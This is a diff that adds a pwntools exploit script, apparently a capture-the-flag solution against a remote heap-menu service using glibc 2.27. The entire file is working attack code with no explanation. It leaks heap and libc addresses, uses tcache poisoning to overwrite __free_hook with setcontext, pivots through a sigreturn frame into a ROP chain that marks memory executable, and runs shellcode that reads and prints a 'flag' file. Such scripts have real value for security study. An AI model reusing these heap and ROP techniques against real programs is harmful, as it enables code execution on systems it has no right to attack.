@@ -1,0 +1,137 @@
+from pwn import *
+
+io=remote('183.129.189.60',10028)
+libc=ELF('./libc-2.27.so')
+context.arch = 'amd64'
+
+def add(size,data):
+    io.recvuntil('choice :')
+    io.sendline('1')
+    io.recvuntil('the order?')
+    io.sendline(str(size))
+    io.recvuntil('notes:')
+    io.send(data)
+
+def show():
+    io.recvuntil('choice :')
+    io.sendline('3')
+
+def free(idx):
+    io.recvuntil('choice :')
+    io.sendline('4')
+    io.recvuntil('of order:')
+    io.sendline(str(idx))
+
+def edit(idx,data):
+    io.recvuntil('choice :')
+    io.sendline('2')
+    io.recvuntil('of order:')
+    io.sendline(str(idx))
+    io.send(data)
+
+add(0x100,'/bin/sh\x00')#0
+add(0x100,p64(0)*0x10)#1
+add(0,'')#2
+add(8,'c')#3
+
+add(0,'')#4
+add(8,'d')#5
+
+[add(0x100,'a') for i in range(7)]
+[free(i+6) for i in range(7)]
+
+
+[edit(2,'') for i in range (5)]
+show()
+
+io.recvuntil('[2]:')
+heap=u64(io.recv(6).ljust(8,'\x00'))
+print(hex(heap))
+free(3)
+add(8,p64(heap-0x130))#3
+add(8,'3')
+free(1)
+show()
+
+io.recvuntil('[6]:')
+libc_base=u64(io.recv(6).ljust(8,'\x00'))-0x3ebca0
+print(hex(libc_base))
+free_hook=libc_base+libc.sym['__free_hook']
+setcontext=libc_base+libc.sym['setcontext']
+
+edit(4,'')
+edit(4,'')
+free(5)
+
+add(8,p64(free_hook))#1
+add(8,p64(setcontext+53))#edit_free_hook  5
+
+syscall=libc_base+libc.search(asm("syscall\nret")).next()
+print(hex(syscall))
+frame = SigreturnFrame()
+frame.rax=0
+frame.rdi=0
+frame.rsi=free_hook&0xfffffffffffff000
+frame.rdx=0x2000
+frame.rsp=free_hook&0xfffffffffffff000
+frame.rip=syscall
+pl=str(frame)
+
+edit(0,pl)
+free(0)
+
+layout = [
+    libc_base+libc.search(asm("pop rdi\nret")).next(), #: pop rdi; ret;
+    free_hook & 0xfffffffffffff000,
+    libc_base+libc.search(asm("pop rsi\nret")).next(), #: pop rsi; ret;
+    0x2000,
+    libc_base+libc.search(asm("pop rdx\nret")).next(), #: pop rdx; ret;
+    7,
+    libc_base+libc.search(asm("pop rax\nret")).next(), #: pop rax; ret;
+    10,
+    syscall, #: syscall; ret;
+    libc_base+libc.search(asm("jmp rsp")).next(), #: jmp rsp;
+]
+
+shellcode = asm('''
+sub rsp, 0x800
+push 0x67616c66
+mov rdi, rsp
+xor esi, esi
+mov eax, 2
+syscall
+
+cmp eax, 0
+js failed
+
+mov edi, eax
+mov rsi, rsp
+mov edx, 0x100
+xor eax, eax
+syscall
+
+mov edx, eax
+mov rsi, rsp
+mov edi, 1
+mov eax, edi
+syscall
+
+jmp exit
+
+failed:
+push 0x6c696166
+mov edi, 1
+mov rsi, rsp
+mov edx, 4
+mov eax, edi
+syscall
+
+exit:
+xor edi, edi
+mov eax, 231
+syscall
+''')
+io.sendline(flat(layout) + shellcode)
+
+
+io.interactive()
